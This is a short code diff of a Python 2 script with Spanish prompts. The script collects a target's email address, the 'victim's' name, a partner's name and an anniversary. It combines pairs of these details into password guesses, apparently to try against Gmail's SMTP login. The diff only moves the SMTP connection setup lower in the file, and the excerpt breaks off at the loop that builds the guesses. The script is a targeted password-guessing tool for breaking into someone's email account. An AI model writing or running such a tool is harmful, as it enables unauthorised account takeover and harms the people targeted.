@@ -4,8 +4,6 @@
 
 import smtplib
 if __name__ == '__main__':
-	server = smtplib.SMTP('smtp.gmail.com:587')
-	server.starttls()
 	data = []
 	user = str(raw_input("introduce el correo electronico: "))
 	name = str(raw_input("introduce el nombre de la victima: "))
@@ -20,6 +18,8 @@ if __name__ == '__main__':
 		data.append(couple2)
 		anniversary = str(raw_input("cuando es el aniversario de {} y {}?: ".format(name, couple2)))
 		data.append(anniversary)
+	server = smtplib.SMTP('smtp.gmail.com:587')
+	server.starttls()
 	for passw in data:
 		for passw2 in data:
 			rpass = passw + passw2
